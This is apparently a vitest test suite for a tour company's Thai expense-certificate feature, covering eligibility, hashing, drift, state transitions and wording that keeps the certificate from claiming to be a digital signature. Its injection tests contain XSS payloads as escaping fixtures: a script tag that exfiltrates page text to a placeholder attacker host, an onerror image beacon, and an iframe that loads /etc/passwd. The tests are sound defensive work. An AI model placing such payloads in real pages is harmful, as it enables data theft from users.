import { describe, expect, it } from "vitest";
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import type { Expense } from "@/lib/jobsheet";
import { evidenceState, type ExpenseWithEvidence } from "@/lib/reimbursement-evidence";
import { buildPayload, canonicalString, certifiableRows, checkDrift, duplicateIdentities, fileHash, ineligibleRows, payloadHash, type SheetFacts } from "@/lib/certificates/payload";
import { renderCertificateHtml, thaiDate, thaiDateTime } from "@/lib/certificates/document";
import { canMove, CERTIFICATE_STATES, FORBIDDEN_TERM_TH, isEvidence, moveRefusal, type CertificateState } from "@/lib/certificates/state";
import { certificateFileName } from "@/lib/certificates/pdf";
import { certificateFolder, legacyCertificateFolder } from "@/lib/certificates/access";

// A certificate is the company's own record that an unreceipted expense happened, signed
// off by a named person who was logged in at the time. It is not a signature and not a
// tax document, and the tests below are as much about it not claiming to be either as
// about the arithmetic.
//
// All data invented — this repo is public.

/** A file with its comments removed, so a rule about CODE is not tripped by prose. */
const code = (rel: string) =>
  readFileSync(join(process.cwd(), rel), "utf8").replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");

const row = (over: Partial<Expense> = {}): Expense =>
  ({ description: "Ferry", price: 11, pax: 4, expenseType: "transport", paidBy: "guide", paidBySource: "operator", ...over } as Expense);
const FACTS: SheetFacts = {
  jobRef: "FOLK-TEST-20990401-01", tourDate: "2099-04-01", slotIdx: 0,
  guideId: "G-900", guideName: "Somchai Testsuite",
  guideReportedAt: new Date("2099-04-02T06:30:00.000Z"),
};

describe("which rows a certificate may speak for", () => {
  it("only the guide's own money, with no receipt and no waiver", () => {
    const rows = certifiableRows([
      row(),                                                        // yes
      row({ description: "Temple", paidBy: "advance" }),            // company advance — not this
      row({ description: "Van", paidBy: "company" }),               // company paid — not this
      row({ description: "Boat", receiptUrl: "https://drive.example.test/r" }), // has a receipt
      row({ description: "Free", price: 0 }),                       // nothing to pay
      { description: "Review reward", price: 50, pax: 2 } as Expense, // earned, not spent
    ]);
    expect(rows.map((r) => r.description)).toEqual(["Ferry"]);
  });

  it("a row already waived by an admin is left alone", () => {
    const waived = row({ description: "Bus" }) as ExpenseWithEvidence;
    waived.evidenceWaiver = { by: "u_admin", at: "2099-04-02T00:00:00.000Z", reason: "the bus issues no ticket at all" };
    expect(certifiableRows([waived as Expense])).toHaveLength(0);
  });

  it("it draws the line with evidenceState, not with a rule of its own", () => {
    const src = readFileSync(join(process.cwd(), "src/lib/certificates/payload.ts"), "utf8");
    expect(src).toContain("evidenceState");
  });

  it("a row with no Paid By is refused outright — whose money it was is unanswered", () => {
    expect(ineligibleRows([row({ paidBy: "" })])[0]).toContain("no Paid By");
    expect(ineligibleRows([row()])).toEqual([]);
  });
});

describe("the fingerprint of what was certified", () => {
  const p = () => buildPayload(FACTS, certifiableRows([row(), row({ description: "Bus", price: 15 })]));

  it("the same sheet hashes the same, every time", () => {
    expect(payloadHash(p())).toBe(payloadHash(p()));
    expect(payloadHash(p())).toMatch(/^[0-9a-f]{64}$/);
  });

  it("money is compared in satang, so floating point cannot change a document", () => {
    const a = buildPayload(FACTS, certifiableRows([row({ price: 0.1 + 0.2 })]));
    const b = buildPayload(FACTS, certifiableRows([row({ price: 0.3 })]));
    expect(payloadHash(a)).toBe(payloadHash(b));
  });

  it("anything that changes what the page says changes the hash", () => {
    const base = payloadHash(p());
    const variants: Expense[][] = [
      [row({ price: 12 }), row({ description: "Bus", price: 15 })],       // repriced
      [row({ pax: 5 }), row({ description: "Bus", price: 15 })],          // more people
      [row({ description: "Boat" }), row({ description: "Bus", price: 15 })], // renamed
      [row({ description: "Bus", price: 15 }), row()],                    // reordered
      [row()],                                                            // a row removed
    ];
    for (const rows of variants) {
      expect(payloadHash(buildPayload(FACTS, certifiableRows(rows))), `${JSON.stringify(rows)}`).not.toBe(base);
    }
  });

  it("the canonical string names every field, so a future one cannot slip in unhashed", () => {
    const s = canonicalString(p());
    for (const k of ["v=", "job=", "date=", "slot=", "guide=", "guideName=", "reported=", "rows=", "total=", "reason="]) {
      expect(s).toContain(k);
    }
  });

  it("the file hash is of bytes, and is a different thing entirely", () => {
    expect(fileHash(Buffer.from("a certificate"))).toMatch(/^[0-9a-f]{64}$/);
    expect(fileHash(Buffer.from("a"))).not.toBe(fileHash(Buffer.from("b")));
  });
});

describe("noticing the sheet moved after it was certified", () => {
  const expenses = [row(), row({ description: "Bus", price: 15 })];
  const stored = () => {
    const rows = certifiableRows(expenses);
    return { payloadHash: payloadHash(buildPayload(FACTS, rows)), coveredRows: rows };
  };

  it("an untouched sheet has not drifted", () => {
    expect(checkDrift(stored(), { facts: FACTS, expenses }).drifted).toBe(false);
  });

  it("a repriced row drifts, and the reason names it", () => {
    const d = checkDrift(stored(), { facts: FACTS, expenses: [row({ price: 25 }), row({ description: "Bus", price: 15 })] });
    expect(d.drifted).toBe(true);
    expect(d.reasons.join(" ")).toContain("Ferry");
  });

  it("a reordered sheet drifts — the document printed the order somebody read", () => {
    const d = checkDrift(stored(), { facts: FACTS, expenses: [row({ description: "Bus", price: 15 }), row()] });
    expect(d.drifted).toBe(true);
    expect(d.reasons.join(" ")).toMatch(/moved from row/);
  });

  it("attaching a receipt afterwards drifts — that row no longer needs certifying", () => {
    const d = checkDrift(stored(), { facts: FACTS, expenses: [row({ receiptUrl: "https://drive.example.test/r" }), row({ description: "Bus", price: 15 })] });
    expect(d.drifted).toBe(true);
  });

  it("a new unreceipted row drifts — the certificate does not cover it", () => {
    const d = checkDrift(stored(), { facts: FACTS, expenses: [...expenses, row({ description: "Water", price: 10 })] });
    expect(d.drifted).toBe(true);
    expect(d.reasons.join(" ")).toContain("does not cover");
  });
});

describe("two rows that read the same", () => {
  it("are refused, exactly as the save path refuses them", () => {
    const expenses = [row(), row()];
    const out = duplicateIdentities(certifiableRows(expenses), expenses);
    expect(out).toHaveLength(1);
    expect(out[0]).toContain("appears 2 times");
  });
  it("a sheet whose rows all differ is fine", () => {
    const expenses = [row(), row({ description: "Bus", price: 15 })];
    expect(duplicateIdentities(certifiableRows(expenses), expenses)).toEqual([]);
  });
  it("both sides use the same identity function, so they cannot disagree", () => {
    const src = readFileSync(join(process.cwd(), "src/lib/certificates/payload.ts"), "utf8");
    expect(src).toContain('from "@/lib/protected-expense-fields"');
    expect(src).toContain("financialIdentity");
  });
});

describe("the states, and which one is evidence", () => {
  it("only LINKED counts", () => {
    for (const s of CERTIFICATE_STATES) expect(isEvidence(s)).toBe(s === "LINKED");
    expect(isEvidence(null)).toBe(false);
  });

  it("the path runs forward, and void is always available until it is taken", () => {
    expect(canMove("DRAFT", "READY_TO_ATTEST")).toBe(true);
    expect(canMove("READY_TO_ATTEST", "ATTESTED")).toBe(true);
    expect(canMove("ATTESTED", "UPLOADED")).toBe(true);
    expect(canMove("UPLOADED", "LINKED")).toBe(true);
    for (const s of CERTIFICATE_STATES) if (s !== "VOID") expect(canMove(s, "VOID")).toBe(true);
  });

  it("a filing that has to be retried is not a dead end", () => {
    expect(canMove("UPLOADED", "UPLOADED")).toBe(true);
  });

  it("nothing skips ahead to being evidence", () => {
    for (const s of ["DRAFT", "READY_TO_ATTEST", "ATTESTED"] as CertificateState[]) {
      expect(canMove(s, "LINKED")).toBe(false);
      expect(moveRefusal(s, "LINKED")).toBeTruthy();
    }
  });

  it("a withdrawn certificate never comes back, and says why", () => {
    for (const s of CERTIFICATE_STATES) expect(canMove("VOID", s)).toBe(false);
    expect(moveRefusal("VOID", "LINKED")).toContain("withdrawn");
  });
});

describe("a waiver that rests on a certificate is worth what the certificate is worth", () => {
  const waived = (over: Record<string, unknown> = {}): ExpenseWithEvidence =>
    ({ ...row(), evidenceWaiver: { by: "u_admin", at: "2099-04-02T00:00:00.000Z", reason: "certificate in lieu of a receipt", certificateId: "c_1", certificateNo: "CERT-TEST-01", ...over } } as ExpenseWithEvidence);

  it("LINKED is evidence", () => {
    expect(evidenceState(waived(), { c_1: "LINKED" }).state).toBe("WAIVED");
  });

  it("approved but not yet filed is NOT evidence", () => {
    for (const s of ["DRAFT", "READY_TO_ATTEST", "ATTESTED", "UPLOADED"]) {
      const r = evidenceState(waived(), { c_1: s });
      expect(r.state, `status ${s}`).toBe("BLOCKED");
      expect(r.state === "BLOCKED" && r.reason).toContain("not in use as evidence yet");
    }
  });

  it("withdrawn is not evidence, and the row says so", () => {
    const r = evidenceState(waived(), { c_1: "VOID" });
    expect(r.state).toBe("BLOCKED");
    expect(r.state === "BLOCKED" && r.reason).toContain("withdrawn");
  });

  it("a certificate nobody loaded is unproven, not assumed good", () => {
    expect(evidenceState(waived()).state).toBe("BLOCKED");
    expect(evidenceState(waived(), {}).state).toBe("BLOCKED");
  });

  it("an older waiver with no certificate keeps the meaning it was granted with", () => {
    const plain = { ...row(), evidenceWaiver: { by: "u_admin", at: "2099-04-02T00:00:00.000Z", reason: "the temple prints no ticket" } } as ExpenseWithEvidence;
    expect(evidenceState(plain).state).toBe("WAIVED");
    expect(evidenceState(plain, { c_1: "VOID" }).state).toBe("WAIVED");
  });
});

describe("the document itself", () => {
  const view = () => ({
    certificateNo: "CERT-FOLK-TEST-20990401-01-01",
    payload: buildPayload(FACTS, certifiableRows([row(), row({ description: "Bus", price: 15 }), row({ description: "Water", price: 10, expenseType: "meal" })])),
    payloadHash: "a".repeat(64),
    attestedByName: "Malee Testsuite", attestedByRole: "ADMIN",
    attestedAt: "2099-04-03T09:15:00.000Z",
    auditRef: "cert_test_id",
  });

  it("renders the same bytes twice — a file hash means nothing otherwise", () => {
    expect(renderCertificateHtml(view())).toBe(renderCertificateHtml(view()));
  });

  it("says what it is, and what it is not", () => {
    const html = renderCertificateHtml(view());
    expect(html).toContain("ใบรับรองแทนใบเสร็จรับเงิน");
    expect(html).toContain("ใช้เป็นหลักฐานประกอบการบันทึกบัญชีภายใน");
    expect(html).toContain("ไม่ใช่ใบกำกับภาษี");
  });

  it("describes the guide's act as filing a report, never as certifying or signing", () => {
    const html = renderCertificateHtml(view());
    expect(html).toContain("ไกด์ส่งรายงานค่าใช้จ่ายผ่านบัญชีของตนเมื่อ");
    expect(html).not.toMatch(/ไกด์(ได้)?(ลงนาม|รับรอง)/);
    expect(html).toContain("ไกด์ไม่ต้องลงนามในเอกสารนี้");
  });

  it("calls the approval what it is, and never a digital signature", () => {
    const html = renderCertificateHtml(view());
    expect(html).toContain("รับรองเอกสารทางอิเล็กทรอนิกส์");
    expect(html).not.toContain(FORBIDDEN_TERM_TH);
    expect(html).toContain("ไม่ได้ลงลายมือชื่ออิเล็กทรอนิกส์แบบเข้ารหัส");
  });

  it("does not claim the hash proves who approved it", () => {
    expect(renderCertificateHtml(view())).toContain("ไม่ได้ใช้พิสูจน์ตัวบุคคลผู้รับรอง");
  });

  it("prints the approver, their role and the moment, from the record", () => {
    const html = renderCertificateHtml(view());
    expect(html).toContain("Malee Testsuite");
    expect(html).toContain("ADMIN");
    expect(html).toContain("2642"); // Buddhist era — 2099 + 543
  });

  it("adds the rows up, in figures and in words", () => {
    const html = renderCertificateHtml(view());
    expect(html).toContain("144.00");                      // 44 + 60 + 40
    expect(html).toContain("หนึ่งร้อยสี่สิบสี่บาทถ้วน");
  });

  it("carries no clock of its own — nothing renders differently an hour later", () => {
    const src = code("src/lib/certificates/document.ts");
    expect(src).not.toMatch(/new Date\(\s*\)/);
    expect(src).not.toContain("Date.now()");
  });

  it("formats Thai dates in the Buddhist era, without a timezone surprise", () => {
    expect(thaiDate("2099-04-01")).toBe("1 เมษายน 2642");
    expect(thaiDateTime("2099-04-01T17:30:00.000Z")).toContain("2 เมษายน 2642"); // +07:00 rolls over
    expect(thaiDateTime(null)).toBe("—");
  });
});

describe("where the file goes", () => {
  it("one deterministic name, so a retry replaces rather than duplicates", () => {
    expect(certificateFileName("CERT-X-01")).toBe("CERT-X-01.pdf");
  });
  it("filed beside the job sheets it belongs to", () => {
    // Not under "Folkpaths Job Sheets" — that tree is shared with guides.
    expect(certificateFolder("2099-04-01")).toEqual(["Folkpaths Finance", "Private Expense Certificates", "2099-04"]);
    expect(certificateFolder("2099-04-01")[0]).not.toBe("Folkpaths Job Sheets");
    expect(legacyCertificateFolder("2099-04-01")).toEqual(["Folkpaths Job Sheets", "2099-04 April", "Expense Certificates"]);
  });
});

describe("repository invariant — this feature does not claim to be a signature", () => {
  const walk = (dir: string, out: string[] = []): string[] => {
    for (const e of readdirSync(dir)) {
      const p = join(dir, e);
      if (e === "node_modules" || e === ".next") continue;
      if (statSync(p).isDirectory()) walk(p, out);
      else if (/\.tsx?$/.test(p) && !/\.test\.tsx?$|\.itest\.tsx?$/.test(p)) out.push(p);
    }
    return out;
  };

  it("nothing anywhere calls it ลายเซ็นดิจิทัล", () => {
    // There is no key and no certificate authority. Saying "digital signature" would
    // claim a guarantee this does not provide, and an accounting record that overstates
    // its own strength is worse than one that is plain about it.
    // lib/certificates/state.ts is where the term is DECLARED forbidden, so it is the
    // one file allowed to contain it.
    const declares = join(process.cwd(), "src/lib/certificates/state.ts");
    const offenders = walk(join(process.cwd(), "src")).filter((f) => f !== declares && readFileSync(f, "utf8").includes(FORBIDDEN_TERM_TH));
    expect(offenders.map((f) => f.replace(process.cwd(), "")), "use รับรองเอกสารทางอิเล็กทรอนิกส์ instead").toEqual([]);
  });

  it("nor digitally signed, in English — in anything a user or a caller sees", () => {
    // Comments are exempt, and deliberately so: a comment explaining that this is NOT a
    // digital signature is the kind of honesty worth keeping. What must never say it is
    // the code, the identifiers and the text on the screen.
    //
    // Narrow on purpose: "x-line-signature" is a header, not a claim about this feature.
    const bad = /\bdigitally[\s-]?signed\b|\bdigital signature\b|\belectronic signature\b/i;
    const declares = join(process.cwd(), "src/lib/certificates/state.ts");
    const strip = (t: string) => t.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");
    const offenders = walk(join(process.cwd(), "src")).filter((f) => f !== declares && bad.test(strip(readFileSync(f, "utf8"))));
    expect(offenders.map((f) => f.replace(process.cwd(), ""))).toEqual([]);
  });

  it("certifiedAt is never used as evidence from the guide", () => {
    // It is the operator's first save (lib/certifier). The guide's own act is
    // guideExpensesAt, and only that may stand for them.
    for (const f of ["src/lib/certificates/payload.ts", "src/lib/certificates/service.ts", "src/lib/certificates/document.ts"]) {
      expect(code(f), `${f} must not read certifiedAt`).not.toContain("certifiedAt");
    }
  });
});

describe("what a person can type cannot become part of the page", () => {
  // Descriptions come off a job sheet, which an operator types and a guide's own report
  // can seed. They are text, and the document has to print them as text — not as markup,
  // not as a script, and not as something that fetches.
  const attack = (description: string) => {
    const payload = buildPayload({ ...FACTS, guideName: description }, certifiableRows([row({ description })]));
    return renderCertificateHtml({
      certificateNo: description, payload, payloadHash: "b".repeat(64),
      attestedByName: description, attestedByRole: description,
      attestedAt: "2099-04-03T09:15:00.000Z", auditRef: description,
    });
  };

  it("a script tag is printed, not run", () => {
    const html = attack('<script>fetch("https://evil.example.test/"+document.body.innerText)</script>');
    expect(html).not.toContain("<script>fetch");
    expect(html).toContain("&lt;script&gt;");
  });

  it("an image that would phone home never becomes a tag", () => {
    const html = attack('<img src="https://evil.example.test/pixel.png" onerror="alert(1)">');
    expect(html).not.toMatch(/<img[^>]*evil\.example\.test/);
    expect(html).toContain("&lt;img");
  });

  it("a local file cannot be pulled in", () => {
    const html = attack('<iframe src="file:///etc/passwd"></iframe>');
    expect(html).not.toContain("<iframe");
    expect(html).toContain("&lt;iframe");
  });

  it("an attribute cannot be broken out of, in quotes or backticks", () => {
    const html = attack('" onload="alert(1)` `');
    expect(html).not.toContain('onload="alert(1)');
    expect(html).toContain("&quot;");
    expect(html).toContain("&#96;");
  });

  it("a style block cannot be injected to rewrite what the page says", () => {
    const html = attack("<style>td{display:none}</style>");
    expect(html).not.toContain("<style>td{display:none}");
  });

  it("the rendered page pulls in nothing from anywhere", () => {
    const html = renderCertificateHtml({
      certificateNo: "CERT-X-01",
      payload: buildPayload(FACTS, certifiableRows([row()])),
      payloadHash: "c".repeat(64), attestedByName: "A", attestedByRole: "ADMIN",
      attestedAt: "2099-04-03T09:15:00.000Z", auditRef: "x",
    });
    expect(html).not.toMatch(/<script|<iframe|<object|<embed/i);
    expect(html).not.toMatch(/src\s*=|@import|url\(\s*["']?(https?|file):/i);
    expect(html).not.toMatch(/<link\b/i);
  });

  it("a number that arrived as text prints as a number", () => {
    // The payload is read back out of a JSON column, so "5" is as likely as 5.
    const payload = buildPayload(FACTS, certifiableRows([row()]));
    (payload.rows[0] as unknown as Record<string, unknown>).pax = "<b>9</b>";
    const html = renderCertificateHtml({
      certificateNo: "CERT-X-01", payload, payloadHash: "d".repeat(64),
      attestedByName: "A", attestedByRole: "ADMIN", attestedAt: "2099-04-03T09:15:00.000Z", auditRef: "x",
    });
    expect(html).not.toContain("<b>9</b>");
  });
});

describe("the renderer's own guarantees", () => {
  it("it refuses rather than guessing when no browser is installed", () => {
    const src = code("src/lib/certificates/pdf.ts");
    expect(src).toContain("PDF_UNAVAILABLE");
    expect(src).toContain("findExecutable");
    // The path is computed by lib/certificates/browser; nothing here reads an env var
    // and treats it as a browser.
    expect(src).not.toContain("process.env");
  });

  it("it blocks the network and turns scripts off before the page loads", () => {
    const src = code("src/lib/certificates/pdf.ts");
    expect(src).toContain("setRequestInterception(true)");
    expect(src).toContain("setJavaScriptEnabled(false)");
    // The abort has to come before setContent, or the page has already fetched.
    expect(src.indexOf("setRequestInterception")).toBeLessThan(src.indexOf("setContent"));
  });

  it("it renders one at a time — a browser each, on a small container", () => {
    expect(code("src/lib/certificates/pdf.ts")).toContain("renderQueue");
  });

  it("it always closes the browser, including when the render throws", () => {
    const src = code("src/lib/certificates/pdf.ts");
    expect(src).toMatch(/finally\s*\{[\s\S]*browser\?\.close\(\)/);
  });

  it("the payment worker never loads it — it has no certificates to render", () => {
    // Chromium in the worker image would be a few hundred megabytes for nothing, and a
    // worker that could render could also file, which is not a decision a background
    // process should be making.
    const worker = readFileSync(join(process.cwd(), "src/workers/payment-worker.ts"), "utf8");
    for (const forbidden of ["certificates/", "puppeteer", "certificates/drive", "certificates/pdf"]) {
      expect(worker, `the worker must not pull in ${forbidden}`).not.toContain(forbidden);
    }
  });

  it("nor does anything the worker bundles reach the renderer or the Drive client", () => {
    // The import graph, not just the entry file: a transitive import would put Chromium
    // in the worker build all the same.
    const seen = new Set<string>();
    const resolve = (from: string, spec: string) => {
      if (spec.startsWith("@/")) return join(process.cwd(), "src", spec.slice(2));
      if (spec.startsWith(".")) return join(from, "..", spec);
      return null;
    };
    const walkImports = (file: string) => {
      for (const ext of ["", ".ts", ".tsx", "/index.ts"]) {
        const p = `${file}${ext}`;
        if (!existsSync(p) || statSync(p).isDirectory() || seen.has(p)) continue;
        seen.add(p);
        const src = readFileSync(p, "utf8");
        for (const m of src.matchAll(/from\s+["']([^"']+)["']/g)) {
          const next = resolve(p, m[1]);
          if (next) walkImports(next);
        }
        return;
      }
    };
    walkImports(join(process.cwd(), "src/workers/payment-worker.ts"));
    const reached = [...seen].filter((f) => /certificates\/(pdf|drive)\.ts$/.test(f));
    expect(reached.map((f) => f.replace(process.cwd(), "")), "the worker's import graph reaches the renderer or Drive client").toEqual([]);
  });
});

describe("the words the states are described in", () => {
  it("nothing is called signed any more — a person attested it", () => {
    for (const f of ["src/lib/certificates/state.ts", "src/lib/certificates/service.ts", "src/components/ExpenseCertificatePanel.tsx"]) {
      const src = code(f);
      expect(src, `${f}`).not.toMatch(/\bSIGNED\b|\bREADY_TO_SIGN\b|\bsignedAt\b|\bsignerName\b/);
    }
  });
  it("and ATTESTED still is not evidence", () => {
    expect(isEvidence("ATTESTED")).toBe(false);
    expect(canMove("ATTESTED", "LINKED")).toBe(false);
  });
});
